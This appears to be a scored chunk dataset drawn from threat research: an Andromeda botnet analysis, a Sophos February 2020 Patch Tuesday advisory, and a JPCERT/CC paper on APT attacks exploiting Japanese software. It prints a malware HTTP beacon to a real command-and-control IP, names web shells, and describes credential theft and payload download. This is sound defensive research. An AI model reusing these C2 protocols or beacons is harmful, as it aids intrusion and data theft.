The message will be encrypted before sending. Figure 8 shows the hard-coded pre-key used by the first encryption layer. It is probably a hash code of a string. In some older versions, the pre-key was ‘blablablaandromeda’, which is where the botnet’s name came from. Moreover, the C&C servers use fast-flux techniques to switch their IP from time to time.
Figure 8. Pre-key highlighted.
The first encryption layer is RC4 with the key-scheduling algorithm obfuscated. Figure 9 shows the early stage of the key-scheduling algorithm (KSA). As you can see in the first loop, it initializes the array ‘S’ backwards.
Figure 9. A piece of KSA in RC4.
The second encryption layer uses the CryptBinaryToString function to encode the hex value to a base64 string, so that it can be transferred as part of the HTTP Get message body. It tries to send the encrypted message to three different URLs. These URLs are hard-coded in the DLL body, as shown in Figure 10.
Figure 10. Hard-coded URLs.
It waits until any of the above servers replies. The first four bytes of the response message are the checksum of the decrypted message. The decryption uses RC4 again with the VolumeSerialNumber as pre-key. Then there is a function to calculate the checksum of the decrypted message and compare it with the one sent by the server.
After decryption, one kind of response is shown in Figure 11.
Figure 11. C&C server command, decrypted.
The first dword (0x0000 0009) is used as a multiplier to a hard-coded number to get the new time interval for this communication thread. The following byte (0x01) decides which task the downloader is going to perform. The tasks are:
(1) download and execute
(2) redirect to another C&C server
(3) download, execute and modify registry
(4) modify registry.
It will send a log report to the C&C server after whichever job is done. Task (1) is the main purpose of this downloader, to download and run the spam engine.
Once a task is completed, a string is created with the format: ‘id:%lu|tid:%lu|result:%lu’. The string is encrypted with RC4 using the pre-key shown in Figure 8. The ‘id’ is the VolumeSerialNumber; the ‘tid’ is the last dword (0x0000 0009) before the URL in Figure 11, which is probably the version of the downloaded file; and the ‘result’ is the Thread Handle number of the downloaded and executed file, if there is one.",0.017497298449894227
"Phase 4: Spam engine
Besides sending spam, the spam engine also has the ability to search the victim’s computer and harvest various files containing profile information. The applications it targets in this example [5] include:
The Bat! email client
ICQ
Miranda
RQ
Trillian
Ghisler Total Commander
RimArts email client
MS Outlook
CuteFTP
Edailer
Far Manager
WS_FTP
Opera
Mozilla applications
Most of these applications are either FTP or email clients. The more FTP accounts stolen, the more websites can be compromised. And the more email contacts and accounts are stolen, the more sophisticated the spam email can be made. Therefore, the information it harvests in this phase is intended to facilitate the botnet’s propagation (see Phase 1).
Another payload in this phase concerns spamming. At first, the spam engine drops itself to %Application Data%\firewall\system.exe and a configuration file to %System%\dbs.dat. The configuration file mainly stores the encrypted C&C server addresses.
Initially, after installing itself on the victim’s PC, the spam engine will try to contact the C&C server. Figure 12 shows an example of the communication. The host and the Get requests are hard-coded in the engine’s body. The message received is encrypted with two layers.
Figure 12. Initial communication.
The first encryption layer is a custom RC4 without the KSA. The key is already pre-scheduled and stored in the engine’s body. The intention behind this may be to conceal the encryption algorithm and perhaps to gain a little improvement in performance. The second encryption layer is a side-by-side byte-XOR, starting from the bottom of the code, and then the first code XOR with 0xFF.
After decryption, we can see that the message is a table containing URLs of the backup C&C servers and spam template servers. The dword value circled in red specifies the server type (0xE0 means the C&C server and 0xE2 means the spam template server), followed by one byte specifying the URL length and the URL itself. These pieces of information will be encrypted and stored in the configuration file dbs.dat for future use.
Figure 13. C&C response decrypted.
The next task is to send the stolen information to the C&C servers. The stolen information is encrypted using the same method as above, and the malware tries to send it to the servers from the list received in the previous communication.
Then it sends a request to the spam template servers to obtain the latest spam template. The message received is also encrypted by the same method. Figure 14 shows part of the decrypted email template.
Figure 14. Part of the email template.
The template file size is about 70KB, and it contains two email templates. One uses The Bat! (the full format is: ‘The Bat! (v4.%RND_DIGIT.%RND_DIGIT[2]) UNREG’, with the percentage sign and capitals together being random variables) as the X-Mailer string, and the other uses Microsoft Outlook Express 6.00.2800.1106. The email template can be used to compose both the SMTP header and the message body. There is also a large database of words, domains, people’s names, mail servers, compromised website URLs and email addresses for the spammer to choose randomly to fill in the variables in the templates.
The email addresses are probably contacts harvested by the spammers. The chances that they are active email addresses are very high, therefore they can be used as either the senders or the receivers. The templates from the samples we looked at could compose deceptive emails about e-greeting cards or free porn videos, or advertisement emails for dating site registrations (for advertisement purposes, the dating site itself was legitimate and harmless). Thanks to this flexibility, the content of the spam messages can be crafted to be very up to date. For example, in mid-December 2011, it would be very tempting for many users to open an email that appeared to contain a link to a secret video of Muammar Gaddafi’s death.
After creating each email with both the SMTP header and the message body, the spamming engine tries to send it by using the standard SMTP protocol.",0.017648521525415628
"Conclusion
The Andromeda botnet recruits its bots thanks to four key elements: compromised websites, an exploit kit, a downloader and a mailing engine. These are linked by four phases, occurring sequentially. The final phase not only ties back to the first, but also facilitates it by stealing user information such as email contacts, messenger accounts and FTP accounts.
At the time of writing this paper, the mailing engine was only spamming emails advertising a legitimate dating website – suggesting that the botnet had suspended the active recruitment of more bots. The downloaders were only downloading the mailing engines. However, it still has the capacity to download and run arbitrary files – which may be even more harmful and harder to detect.
Because the four phases occur sequentially, breaking any phase can break the circle. The weakest link may be the first phase. Being careful to avoid opening suspicious emails and using up-to-date web browsers should keep most users safely out of the reach of Andromeda’s chains.",0.012328040018131481
"Bibliography
[1] Howard, F. Exploring the Blackhole Exploit Kit. Sophos Naked Security blog. http://nakedsecurity.sophos.com/exploring-the-blackhole-exploit-kit/.
[2] Unless otherwise specified, our analysis of the downloader is based on a sample with md5: ce7b86a201f32b115577551c61a28508.
[3] In Windows XP, the default full path of the file is C:\Windows\System32\wuauclt.exe.
[4] VA: virtual address.
[5] Sample md5: 1a4f7f5205c2fa133131f6f57df6f40b.
",0.014035518404824754
"February, 2020 Patch Tuesday brings a century of updates to Microsoft, Adobe products",0.010955783553734944
"Written by
SophosLabs Offensive Security",0.008622298185940958
"February 11, 2020",0.009748052286686959
SophosLabs Uncut Threat Research Acrobat Adobe Flash Microsoft Patch Tuesday Windows,0.010462606917001183
"For this second Patch Tuesday of 2020, Microsoft has released a hundred patches to Windows and other Microsoft software, including 12 vulnerabilities flagged as Critical, and 87 flagged as Important. In addition, Adobe also published updates for its Flash Player, Acrobat, Framemaker, Experience Manager, and Digital Editions products in notifications timed to coincide with Microsoft’s publication.
Microsoft’s Security Update Guide. will update itself as more information becomes available but the page list no fewer than 26 CVE records that address various vulnerabilities in Microsoft products. If that seems like a lot, Adobe’s list (published on their Security Bulletins and Updates page) lists 17 CVEs just for the Acrobat product lines, 12 of which are rated a critical fix.  Any way you cut it, February may be a short month but it’s one of the largest for updates we’ve seen.
As always, you can manually download the update rollup specific to your supported Windows system from the Microsoft Update Catalog website.
On Windows, the most critical components requiring attention are:",0.013811699312899162
"Windows Kernel
Windows Remote Desktop Protocol (RDP)
Scripting Engine
Windows Media Foundation
Windows Backup Service",0.016983359940581533
"Some particular attention should be drawn to CVE-2020-0674 (Scripting Engine Memory Corruption Vulnerability) as its exploitation has been detected in the wild.
Additionally, the February Patch Tuesday addresses many critical vulnerabilities, which have not (yet) been spotted as actively exploited, but may be in a near future, including:
CVE-2020-0662: Windows Remote Code Execution Vulnerability
CVE-2020-0681: Remote Desktop Client Remote Code Execution Vulnerability
CVE-2020-0734: Remote Desktop Client Remote Code Execution Vulnerability
CVE-2020-0729: LNK Remote Code Execution Vulnerability
CVE-2020-0738: Media Foundation Memory Corruption Vulnerability
CVE-2020-0673: Scripting Engine Memory Corruption Vulnerability
CVE-2020-0710: Scripting Engine Memory Corruption Vulnerability
CVE-2020-0711: Scripting Engine Memory Corruption Vulnerability
CVE-2020-0712: Scripting Engine Memory Corruption Vulnerability
CVE-2020-0713: Scripting Engine Memory Corruption Vulnerability",0.012086197666930532
"SophosLabs has broken down the content of the February 2020 edition of Patch Tuesday as follows:
LNK vulnerability
CVE-2020-0729
One of the most interesting vulnerabilities of this month is CVE-2020-0729: LNK Remote Code Execution Vulnerability. The LNK file type is a [publicly documented] binary format. Unlike Linux which uses Symbolic Links to create shortcuts, Windows relies on this LNK format (although Windows also supports and uses Symbolic Links, via NTFS). As a binary format, it requires the operating system to parse the contents, which can introduce vulnerabilities, as has happened in the past (CVE-2017-8464 or CVE-2015-0096). Little information was communicated from Microsoft, except that a succesful exploitation of this new vulnerability (CVE-2020-0729) would lead to a code execution, possibly remotely. That is probably why Microsoft decided to classify this vulnerability as “Critical.”
Scripting Engine
CVE-2019-1451, CVE-2020-0673, CVE-2020-0674, CVE-2020-0710,
CVE-2020-0711, CVE-2020-0712, CVE-2020-0713
Several Remote Code Execution (RCE) vulnerabilities were discovered and patched this month. Even though those vulnerabilities would not immediately be linked to a full system compromise, their successful exploitation would give an attacker a foothold onto a targeted computer, with associated privileges, allowing further horizontal or vertical escalation.
CVE-2020-0674 is the one other vulnerability that stands out this month, mostly because it has been found exploited in the wild, so its exploitation is not merely theoretical. Therefore SophosLabs urges to apply immediately the available patches to avoid being compromised by any of those vulnerabilities.
RDP service and client
CVE-2020-0655,CVE-2020-0660,CVE-2020-0681, CVE-2020-0734
This month again, RDP happens to be a target of choice, where 4 vulnerabilities were fixed in several components:
– Remote Desktop Service: CVE-2020-0655
– Remote Desktop Client: CVE-2020-0681, CVE-2020-0734
Interestingly some vulnerabilities in the RDP components are related to a incorrect packet parsing when a connection is performed via UDP (CVE-2020-0681), as it was the case last month for CVE-2020-0609 and CVE-2020-0610, which also stemmed from an incorrectly validation of UDP packets.
Aside of the RCE bugs mentioned above, a DoS issue was also patched (CVE-2020-0660).
Windows Kernel Win32k component
CVE-2020-0691, CVE-2020-0716, CVE-2020-0717, CVE-2020-0719,
CVE-2020-0720, CVE-2020-0721, CVE-2020-0722, CVE-2020-0723,
CVE-2020-0724, CVE-2020-0725, CVE-2020-0726, CVE-2020-0731,
CVE-2020-0714, CVE-2020-0709, CVE-2020-0792",0.011619270763781553
"Several memory corruption vulnerabilities have been discovered and patched by Microsoft, in Win32k and DirectX kernel components. Although those vulnerabilities vary by their nature (Use after Free, buffer overflow), their successful exploitation would allow an attacker to locally elevate their privilege; or in the case of a remote scenario (and coupled with (at least) a browser exploit) such vulnerabilities could be triggered remote and allow a browser sandbox escape, giving full control to the attacker and so entirely remotely.",0.009968256890668381
"How is Sophos responding to these threats?
Here is a list of protection released by SophosLabs in response to this advisory to complement any existing protection and generic exploit mitigation capabilities in our products.",0.015510509034313946
"CVE
SAV
IPS",0.009183097362180814
"CVE-2020-0674
Troj/ExpJS-NY, Exp/20200674-A
90001064
90001065
90001067
90001059",0.011146314087205123
Additional IPS Signatures,0.012178648849173856
CVE,0.015603552773460372
SID,0.008271028222603172
"CVE-2020-0658
2301474",0.008889075926548862
"How long does it take to have Sophos detection in place?
We aim to add detection to critical issues based on the type and nature of the vulnerabilities as soon as possible. In many cases, existing detections will catch exploit attempts without the need for updates.
What if the vulnerability/0-day you’re looking for is not listed here?
If we haven’t released an update for a specific exploit, the most likely reason is that we did not receive the data that shows how the exploit works in the real world. As many of this month’s exploits were crafted in a lab and have not been seen in the wild, nobody has enough information (yet) about how criminals would, hypothetically, exploit any given vulnerability. If or when we receive information about real attacks, we will create new detections, as needed.",0.0103922475117596
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
VB2019 paper: APT cases exploiting vulnerabilities in region‑specific software,0.007081779200092564
"Shusei Tomonaga, Tomoaki Tani, Hiroshi Soeda & Wataru Takahashi",0.01493890882492499
"JPCERT/CC, Japan",0.009422395293773644
"Table of contents
Abstract 1. Introduction 2. Attack exploiting Sanshiro’s vulnerability 2.1 Summary of the vulnerability 2.2 Delivery of the zero-day exploit Detail of CVE-2014-0810 (JVNDB-2014-000011) 2.3 The bundled malware with the exploit 2.4 Attack timeline 3. Attack exploiting Ichitaro’s vulnerability 3.1 Summary of Ichitaro 3.2 CVE-2014-7247 Summary of the vulnerability Detail of the shellcode Details of the malware Emdivi Agtid 3.3 Threat actor C&C server 4. Attack exploiting SKYSEA Client View’s vulnerability 4.1 Summary of the vulnerability 4.2 Attack timeline 4.3 Malware infections exploiting this vulnerability Wali Small downloader NodeRAT 4.4 Attack infrastructure Attacking IP address C&C server 5. Discussion of APT campaigns targeting Japan 5.1 APT17 Attack timeline Initial access Watering hole attack Supply chain attack Lateral movement 5.2 Cloudy Omega / Blue Termite Attack timeline Initial access Lateral movement 5.3 BRONZE BUTLER / Tick Attack timeline Initial access Lateral movement Conclusion References Appendix: IoCs SHA 256 C&C servers Attacking IP addresses Backdoor access IP addresses Footnotes",0.013814097892200228
Abstract,0.009485057568311417
"APT attacks often leverage software vulnerabilities to infect victims with malware. Commonly targeted software includes Microsoft Office, IE and Adobe Flash Player, all of which are in widespread use all over the world. On the other hand, some APT attacks are carried out by exploiting vulnerabilities in region-specific software. Government agencies frequently use such localized software, and this tends to be the target of attackers. Such attacks are rarely discussed at international conferences as, by their nature, they relate exclusively to a particular country. In Japan, there have been many cases where attacks have been carried out by exploiting vulnerabilities in software that is only used in Japan, using malware that is unique to Japan. In this paper, we will describe the TTPs of attack groups in recent years. We will also describe the APT groups exploiting vulnerabilities in local software. This paper will provide insights into intelligence analysis and APT handling by looking at the attack characteristics (shellcode, malware, etc.) of different campaigns.",0.01737828891883464
1. Introduction,0.009670202428696317
"Various tactics, techniques and procedures (TTPs) are used by different attackers in order to trick victims into becoming infected with malware. Particularly in APT attacks, highly sophisticated methods such as supply chain attacks, zero-day attacks, etc. are observed. Software that is in widespread use (e.g. Microsoft Office, IE, Adobe Flash Player) is often targeted in zero-day attacks. These types of software are installed on many hosts, making them ideal entry points for malware.",0.01474012733957919
"On the other hand, there are other types of software that are only used in specific countries. Hangul Word Processor (HWP) in South Korea and Ichitaro in Japan are examples. Such software is often targeted and leveraged in attacks against a specific country. There are reported cases in which HWP has been leveraged for APT attacks [1]. It is important to understand such attack cases in order to determine appropriate countermeasures. This research is intended to document and share examples of attacks in which region-specific software is leveraged.",0.01098090509005445
"In Japan, there are many cases where attacks have been carried out by exploiting vulnerabilities in software that is only used within the country. JPCERT/CC has been involved in the incident handling and investigation of many of the cases. In this paper, we will describe the details of these attacks by APT groups in recent years. In particular, attacks involving three types of software will be discussed:",0.019356075478298096
Sanshiro,0.009678972124226526
Ichitaro,0.009682575246623526
SKYSEA Client View,0.008259889229378259
"Sanshiro is a spreadsheet program used in Japan, similar to Excel. Attackers leveraged a vulnerability in this program to attach a malicious file to an email, which infected the user with the PlugX malware. Ichitaro is a Word-like application used in Japan. APT groups leveraged a vulnerability in this program to attach a malicious document file to an email, which infected the user with PlugX. We have confirmed that this vulnerability was leveraged in multiple APT campaigns. This zero-day attack is a peculiar case in which two different APT groups conducted attacks at the same time. SKYSEA is a popular asset management (SAM) solution in Japan. An attack group known as ‘Tick’ infects clients with multi‑platform malware by leveraging a vulnerability in the software remotely. This attack has been observed as of 2019, and the attack pattern continues to change. We will also summarize other TTPs deployed by these APT groups.",0.015703519271327515
2. Attack exploiting Sanshiro’s vulnerability,0.0053745737255320725
2.1 Summary of the vulnerability,0.005168117437179598
"Sanshiro is a spreadsheet program which is widely distributed in Japan. The file extension of Sanshiro is ‘jsd’. The latest major version of the program was released in 2010, and it ceased to be sold in 2014. It was mainly used in the Japanese government and education sector. The Sanshiro series contains a vulnerability that allows arbitrary code execution (CVE-2014-0810 [2]), which was leveraged as a zero-day exploit [3] by APT actors against Japanese government agencies.",0.007091951678404929
2.2 Delivery of the zero-day exploit,0.007665467006051974
The APT group delivered the zero-day exploit code via a spear-phishing email sent to Japanese government agencies (Figures 1 and 2). The email contained a new year greeting and a decoy document with the zero-day exploit attached.,0.023703764287601792
Figure 1: The spear-phishing email.,0.019086662796372278
Figure 2: The decoy image.,0.017415556013716915
Detail of CVE-2014-0810 (JVNDB-2014-000011),0.014118931645416222
"The Sanshiro software contains a component file which has a copy processing error. The vulnerability originates in its lack of data size validation and allows overwriting of the return address of the stack frame. As a result, arbitrary code can be executed on the stack frame. This vulnerability was leveraged to embed shellcode in the Sanshiro document. In the case of the APT attack, the shellcode was then executed through the exploit.",0.007170095429024581
The following software is affected by CVE-2014-0810:,0.006792232704889267
"Sanshiro 2007
before update 3",0.007481841537787193
"Sanshiro 2008
before update 5",0.007470426907252636
"Sanshiro 2009
before update 6",0.007493829067612645
"Sanshiro 2010
before update 6",0.007670752958117699
"Sanshiro Viewer
before 2.0.2.0",0.00811285053237476
"The shellcode searches for the encrypted binary embedded in the Sanshiro document. It then decodes the binary with a single-byte XOR routine, writes a PE binary to the file system, and executes it. The bundled PE file was PlugX [4].",0.010791547808971402
Figure 3: Single-byte XOR decode routine.,0.017115335045014057
2.3 The bundled malware with the exploit,0.0059210490881704825
"In actual attack cases, a malicious Sanshiro document which delivers PlugX was attached to a spear-phishing email. PlugX is a remote access tool (RAT), and infected devices were communicating with a certain C&C server. Further analysis revealed that PlugX had also been used in some past attacks in combination with other vulnerability exploits such as Adobe Flash, Microsoft Word and Ichitaro. As shown in Figure 4, each PlugX sample was communicating with a C&C server with a different domain name. However, it turned out that the domain names all resolved to the same IP address. From the characteristics, it seems as if the series of attacks using PlugX had been conducted by the same actor.",0.014854139795088206
Figure 4: PlugX samples connect to 103.246.112.123.,0.01884333654662551
2.4 Attack timeline,0.009023608893388047
"The actor had developed the Sanshiro exploit and used it before the vulnerability was disclosed in January 2014. JPCERT/CC has observed several spear-phishing emails from the same actor since at least 2013. They used various exploits such as Adobe Flash (CVE-2011-2462 [5]), Microsoft Office Word (CVE-2012-0158 [6]) and Ichitaro (CVE-2013-5990 [7]). In the case of Ichitaro, the actor leveraged the vulnerability as a zero-day exploit. In January 2014, the developer of Sanshiro released a patch [8] and disclosed the vulnerability. Considering the facts, the actor is believed to be highly skilled in developing the exploit and researching the vulnerability of local Japanese software such as Sanshiro and Ichitaro.",0.016909965091553736
Date,0.010601038756765435
Note,0.009461554190370092
April 2013,0.00889400599513801
Spear-phishing mail with MS Office exploit (CVE-2012-0158),0.015640171233228584
May 2013,0.008584504517701652
Spear-phishing mail with Adobe pdf exploit (CVE-2011-2462),0.013367848771670632
September 2013,0.009680427352560361
Spear-phishing mail with Ichitaro zero-day exploit (CVE-2013-5990),0.011163308156166174
November 2013,0.009301451382551451
"Disclose CVE-2013-5990 and, release the update patches of Ichitaro series",0.0076209177979214004
November 2013,0.009301451382551451
Spear-phishing mail with Ichitaro exploit (CVE-2013-5990),0.01145246965097746
December 2013,0.009912912130653151
Spear-phishing mail with Sanshiro zero-day exploit (CVE-2014-0810),0.011380174873733662
January 2014,0.009153657968341222
"Disclose CVE-2014-0810 and, release the update patches of Sanshiro series",0.00796228544722577
Table 1: Exploits used by the actor.,0.011766568146355127
3. Attack exploiting Ichitaro’s vulnerability,0.005280943060817278
3.1 Summary of Ichitaro,0.00832812271429273
"Ichitaro is a popular Japanese word-processing program, first released in 1983. It has been widely used in government agencies as well by the general consumer market. In spite of its popularity, however, a number of vulnerabilities have been found in this product, some of which have been leveraged in targeted attacks. Table 2 shows the vulnerabilities that have been leveraged in targeted attacks. The next section will describe CVE-2014-7247, which has been exploited in many attack cases.",0.012204997835742804
Published,0.009081479015907279
CVE,0.015603552773460372
Overview,0.008067833318706974
CVSSv2,0.007969262470392313
2014/11/13,0.00880131367197523
CVE-2014-7247,0.008544401407665547
Arbitrary Code Execution (ACE),0.016053801854361782
9.3,0.007691546432592067
2013/11/12,0.009261348971189243
CVE-2013-5990,0.008791607191836692
Arbitrary Code Execution (ACE),0.016053801854361782
9.3,0.007691546432592067
2013/06/18,0.010300890186352829
CVE-2013-3644,0.008758762923991803
Arbitrary Code Execution (ACE),0.016053801854361782
9.3,0.007691546432592067
2013/02/26,0.011424535528072544
CVE-2013-0707,0.009010025099457919
Arbitrary Code Execution (ACE),0.016053801854361782
6.8,0.007551080153441858
2011/06/16,0.012940257476077632
CVE-2011-1331,0.009489109422634479
Arbitrary Code Execution (ACE),0.016053801854361782
9.3,0.007691546432592067
2010/11/04,0.012206204033309631
CVE-2010-3916,0.010088552629391012
Arbitrary Code Execution (ACE),0.016053801854361782
9.3,0.007691546432592067
2010/11/04,0.012206204033309631
CVE-2010-3915,0.009939712249936283
Arbitrary Code Execution (ACE),0.016053801854361782
9.3,0.007691546432592067
2010/06/01,0.010841602148602747
CVE-2010-2152,0.009758329522024267
Arbitrary Code Execution (ACE),0.016053801854361782
9.3,0.007691546432592067
2010/04/12,0.010915822687005639
CVE-2010-1424,0.01002779906311535
Arbitrary Code Execution (ACE),0.016053801854361782
9.3,0.007691546432592067
Table 2: Ichitaro vulnerabilities used in targeted attacks.,0.011605237827900572
3.2 CVE-2014-7247,0.007547320601076213
"CVE-2014-7247 was exploited as a zero-day vulnerability. The attack was carried out through targeted emails which were distributed to government agencies and enterprises in Japan. The emails were crafted to convince recipients to open the attachment, which contained an Ichitaro document leveraging the CVE-2014-7247 vulnerability. Figures 5 and 6 show the email contents and the decoy document.",0.009769676774670555
Figure 5: The spear-phishing email.,0.018549657624569282
Figure 6: Decoy document to be displayed.,0.015963788911747656
Summary of the vulnerability,0.005196736319366124
"CVE-2014-7247 is a vulnerability that causes a stack overflow due to a failure in copy processing called from JCXCALC.DLL, one of the component files in Ichitaro, that allows writing of an excessive amount of data in the local static array. As a result, the return address on the stack can be altered to an arbitrary value. By leveraging this vulnerability, attackers can execute shellcode on the stack.",0.007221327029678037
Detail of the shellcode,0.007146800302644807
"The shellcode consists of two sets of code. The first set of code searches for the second set embedded in the Ichitaro file loaded in the memory. The second code decodes the shellcode with XOR (Figure 7). The decoded shellcode extracts and executes the malicious program embedded in the Ichitaro file (PE image). The following types of malware are executed, as confirmed by JPCERT/CC.",0.016928688978754658
Emdivi,0.009037495535881068
PlugX,0.0068115458700628295
Agtid,0.007218738333161889
Figure 7: XOR decode processing.,0.016159872038159717
Details of the malware,0.009372280282036516
Emdivi,0.009037495535881068
"Emdivi is a bot that communicates via HTTP protocol. The malware versions are managed systematically by the developer, and there are occasional functional updates. Among these, versions t17, t19 and t20 have outstanding characteristics. These versions seem to be used in different phases of the attack: t17 for initial intrusion, and t19 and t20 during the incubation period. t17 contains about 10 commands, which perform file download/upload and event log deletion. t20 is a more advanced HTTP bot and contains up to 40 commands. It has self-camouflage functions such as hard-coding IP addresses of victims’ proxy servers and running on certain devices only [9].",0.01298312829136028
Agtid,0.007218738333161889
"Agtid is a bot that communicates via HTTP protocol. It performs basic functions such as file operations and downloading/executing files. One of its features is that its communication contains the string ‘Agtid’ in the HTTP request header. It also contains the string ‘DGGYDSYRL’, as described by FireEye [10].",0.009299322229634477
The following is an example of the communication that Agtid performs:,0.008042036173118494
"POST /info.asp HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Agtid: [16 bytes of hex]08x
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: 180.150.228.102:443
Content-Length: [data size]
Cache-Control: no-cache
[16 bytes of hex]08x&[Encrypted string]",0.018729741737369188
3.3 Threat actor,0.008163167450998321
"In this section we will examine the actors who conducted attacks leveraging CVE-2014-7247 based on the malware compile time and file property information. The compile time of the malware used by the attackers is shown in Figure 8. It shows that PlugX was created between 2014/11/3 and 2014/11/6. Emdivi was also created between the same dates. It is clear that the two types of malware were created during the same time period. For Agtid, the compile time was set to 1970/1/1 (Unix time number 0), and the attack using the malware was observed on 2014/11/7. Two weeks after the attack was confirmed, the vendor released a patch for Ichitaro.",0.014550843455657714
Figure 8: Timeline.,0.01663139758224208
Ichitaro document,0.009161905799068726
Windows binary,0.007324817781881321
Filename,0.007907979926735642
Author,0.014222879032106395
Filename,0.007907979926735642
Family,0.00779481214359401
Compile time,0.00953287846798434
概要と評価.jtd,0.012403652447565472
gfz-l,0.008174064376891832
windump.exe,0.008883232298617982
Emdivi,0.009037495535881068
2014/11/03 2:32,0.009536870570578615
日米外安全保障政策20141106(未定稿).jtd,0.01652515702775792
Windows ユーザー,0.015027014394867644
windump.exe,0.008883232298617982
PlugX,0.0068115458700628295
2014/11/03 3:01,0.010144502620447526
沖縄振興特別措置法のあらまし.jtd,0.017954413361491506
gfz-l,0.008174064376891832
windump.exe,0.008883232298617982
PlugX,0.0068115458700628295
2014/11/04 9:19,0.010846241541152213
石油技術開発 調査事業成果報告書.jtd,0.018049580783715213
gfz-l,0.008174064376891832
windump.exe,0.008883232298617982
PlugX,0.0068115458700628295
2014/11/04 10:15,0.011278682966343934
★合体版.jtd,0.014793130995865655
gfz-l,0.008174064376891832
windump.exe,0.008883232298617982
Emdivi,0.009037495535881068
2014/11/05 12:15,0.011560322166090375
悪質な資格講座の電話勧誘に御注意！！.jtd,0.01737547990318411
gfz-l,0.008174064376891832
windump.exe,0.008883232298617982
Emdivi,0.009037495535881068
2014/11/06 4:20,0.010427822892209115
健康保険のお知らせ.jtd,0.016380567466166784
gfz-l,0.008174064376891832
windump.exe,0.008883232298617982
Emdivi,0.009037495535881068
2014/11/06 4:55,0.010455537651981817
有識者懇談会報告書.jtd,0.01841345568337016
gfz-l,0.008174064376891832
windump.exe,0.008883232298617982
PlugX,0.0068115458700628295
2014/11/06 11:20,0.011828471250763029
Table 3: Detailed timeline.,0.017294515240304675
"The file properties of the malware are listed in Table 3. We can see similarities in the file properties. One is that the author of the Ichitaro document file (Figure 9) is the same. Also, the file name of the malware itself is identical. Based on the similarity between the files and the timeline of the zero-day exploit, it is assumed that the attackers who used Emdivi and PlugX are the same. They are referred to as ‘Blue Termite’ by Kaspersky [11] and others. In addition, attack activities using Agtid (referred to as ‘APT17’ by FireEye [12] and others) were observed soon after the Blue Termite campaign. In this way, it is suggested that CVE-2014-7247 had been leveraged as a zero-day by these two actors.",0.015852442222997976
Figure 9: Ichitaro document - author.,0.013217884231952026
C&C server,0.007254074167762359
A backdoor was installed in the C&C servers used in Blue Termite. It was created based on ASP and PHP. The following backdoor has been confirmed:,0.008371936070586394
DST Asp站長檢測Tools (Figure 10),0.013792302709448423
Anti-shell (Figure 11),0.014110511234005862
Spider PHP shell,0.007154741957637767
X14ob-Sh3ll,0.007813751218123333
"The backdoor’s functions include file upload, download and execution.",0.010804804856907269
Figure 10:DST Asp站長檢測Tools (ASP).,0.015724605353639065
Figure 11: Anti-shell (PHP).,0.011170961148561864
4. Attack exploiting SKYSEA Client View’s vulnerability,0.004967305964662216
4.1 Summary of the vulnerability,0.005115258599052042
SKYSEA Client View is a popular piece of asset management (SAM) software in Japan. The software had a vulnerability (CVE-2016-7836 [13]) that allowed remote code execution due to a flaw in processing authentication on the TCP connection with the management console program. This vulnerability was zero-day-exploited by the APT group BRONZE BUTLER [14] (also known as ‘Tick’).,0.007713993842428546
"This software is only used in networks that are protected by a firewall and is not subject to remote exploit attacks. However, if it is installed on a laptop PC, it may run on a global IP address via a mobile hotspot. In such cases, it will be exposed to the risks of remote exploit attack.",0.008191701837523824
"When the remote exploit attack is successful, the following file is created and executed on the PC:",0.011950141283485038
C:\Program Files\Sky Product\SKYSEA Client View\tmp\00000001.BIN,0.009067957865810161
The attacker can infiltrate the network through the infected PC and spread the infection to other hosts on the network.,0.011186175745452887
4.2 Attack timeline,0.008938646269259776
"BRONZE BUTLER used watering hole attacks (e.g. Adobe Flash Player zero-day exploit) as its main attack method until 2016, however, since late 2016 it has shifted to attacks that leverage the above vulnerability. The attack started in June 2016 and continued until February 2019. Figure 12 shows the behaviour related to this attack activity based on observations in the traffic monitoring system operated by JPCERT/CC.",0.013247805306195848
"The activity went quiet temporarily in October 2017, but resumed on 15 March 2018. The same vulnerability is being leveraged for the entire period. The scan activity is only observed on the sensors placed in Japan, indicating that the attacker is targeting IP addresses allocated to Japan.",0.013958183740624186
Figure 12: Scan count attempting to leverage a vulnerability in SKYSEA Client View (Observation using TSUBAME1).,0.00999015152260141
4.3 Malware infections exploiting this vulnerability,0.005198383349455327
The following three types of malware are used in this attack:,0.008437399775167331
Wali,0.008992119635611862
Small downloader,0.0077520041666439
NodeRAT,0.008230163495442366
"Wali [15] was used from 2016 to May 2017, and another small downloader was used from around July 2017. Before March 2018, the attackers used to leverage Wali and the small downloader in order to spread xxmm [16] and Datper [17], however, the distributed malware changed to another kind after that.",0.013314527739924586
Wali,0.008992119635611862
"Wali is a downloader similar to xxmm. Like xxmm, this malware uses Reflective DLL Injection based on Stephen Fewer’s GitHub code [18]. The pattern of configuration data is also the same (see Figure 13). This malware also has the ability to execute PowerShell commands. When a host is infected by Wali, the attacker sends an encoded PowerShell command to collect information about the host. Figure 14 is an example of a decoded PowerShell command. This command results in the host name, OS version, IP address, username etc. being sent to a C&C server.",0.01401334681087485
"After executing the PowerShell commands, the attacker downloads xxmm, etc.",0.01182529640333585
Figure 13: Wali (left) and xxmm (right) configuration data patterns.,0.016598182935529393
Figure 14: Received PowerShell commands.,0.016908883081347192
Small downloader,0.0077520041666439
"Due to the fact that Wali’s behaviour has been analysed and its details published in many reports by security vendors, BRONZE BUTLER stopped using it and changed to another downloader. This downloader only has the function to download and execute PE files. When the malware is executed, it downloads Base64-encoded xxmm. This Base64-encoded data deletes the MZ signature, and six bytes of data, ‘TVqQAA’ (MZ signature in Base64), are added before decoding. Figure 15 shows the code used to decode the Base64 data.",0.008952665390625003
Figure 15: Received Base64-encoded xxmm.,0.01589250441809109
NodeRAT,0.008230163495442366
"NodeRAT is written in JavaScript and runs on Node.js. NodeRAT is a multi-platform malware which operates in any environment as long as Node.js is installed. This implies that the adversary targets macOS and others as well as Windows. Figure 16 is an example of source code that changes the command to execute depending on the environment. This malware operates according to the JSON configuration information as shown in Figure 17. Table 4 is the list of files that are created when a victim is infected with the malware. If a remote exploit attack succeeds, node.exe will be installed because Node.js is not on Windows OS.",0.017296344572213074
Figure 16: app.js source code.,0.014631032276465672
Figure 17: NodeRAT configuration file.,0.01785990815854066
File/folder name,0.008423551710461052
Description,0.014276898542484706
app.js,0.007294745358383259
Malware itself,0.008279402424597238
node.exe,0.008338419249031115
Node.js,0.008997637863071284
flash.vbs,0.00767724833126282
Script to execute app.js,0.007208174943247991
config.regeditKey.rc,0.008590582770995447
Registry entry information,0.008427082885819281
